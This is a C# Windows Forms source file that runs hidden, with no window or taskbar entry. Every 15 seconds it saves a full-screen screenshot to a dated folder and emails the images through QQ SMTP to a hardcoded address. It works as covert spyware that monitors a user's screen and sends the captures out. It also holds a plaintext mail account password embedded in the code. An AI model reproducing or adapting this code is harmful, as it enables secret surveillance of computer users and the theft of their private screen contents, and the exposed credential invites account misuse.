using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Net.Mail;

namespace Capture
{
    public partial class Form1 : Form
    {

        // 程序时间
        static DateTime time;
        static DateTime currenttime;
        static String path = "c:\\image\\";

        Email email = new Email();

        public Form1()
        {
            InitializeComponent();
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            SetVisibleCore(false);

            this.Load += Form1_Load;
        }

        protected override void SetVisibleCore(bool value)
        {
            base.SetVisibleCore(value);
        }


        System.Timers.Timer myTimer;



        private void Form1_Load(object sender, EventArgs e)
        {

            time = DateTime.Now;

            myTimer = new System.Timers.Timer(15000);//定时周期10秒
            myTimer.Elapsed += myTimer_Elapsed;//到10秒了做的事件
            myTimer.AutoReset = true; //是否不断重复定时器操作
            myTimer.Enabled = true;


            // 初始化邮箱设置
            email.mailFrom = "897920245@qq.com";
            email.mailPwd = "cquhfgwtqtekbbcc";
            email.mailSubject = "屏幕截图:";
            email.mailBody = "截图列表";
            email.isbodyHtml = false;    //是否是HTML
            email.host = "smtp.qq.com";//如果是QQ邮箱则：smtp.qq.com,依次类推
            email.mailToArray = new string[] { "897920245@qq.com"};//接收者邮件集合
            email.mailCcArray = new string[] { "897920245@qq.com" };//抄送者邮件集合

            // 第一次发送
            sendEmail();
        }

        //截图
        private void myTimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            getScreen();
        }

        //邮件
        private void sendEmail() {

            currenttime = DateTime.Now;

            //发送今天所有文件
            String attachfilepath = path + currenttime.Year + currenttime.Month + currenttime.Day;
            // 附件目录
            List<string> strList = new List<string>();
            DirectoryInfo folder = new DirectoryInfo(attachfilepath);
            foreach (FileInfo file in folder.GetFiles("*.jpg"))
            {
                strList.Add(file.FullName);
            }
            email.attachmentsPath = strList.ToArray();
            // 附件
            if (email.Send()) {
                Console.Write("success");
            } ; 
        }

        /// <summary>  
        /// C#截取屏幕并保存为图片  
        /// </summary>  
        public void getScreen()
        {
            Image myImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics g = Graphics.FromImage(myImage);
            g.CopyFromScreen(new Point(0, 0), new Point(0, 0), new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));
            IntPtr dc1 = g.GetHdc();
            g.ReleaseHdc(dc1);

            // 根据日期建立文件夹
            String filepath = path +time.Year+time.Month + time.Day;
            if (!Directory.Exists(filepath))
                Directory.CreateDirectory(filepath);  


            Random objRand = new Random();
            String pic_name = DateTime.Now.ToString("yyyyMMddHHmmssffff") + ".jpg";
            String allpathname = filepath + "\\"+pic_name;  
            myImage.Save(allpathname);
           
            // 释放
            myImage.Dispose();
            g.Dispose(); 
        }


    }
}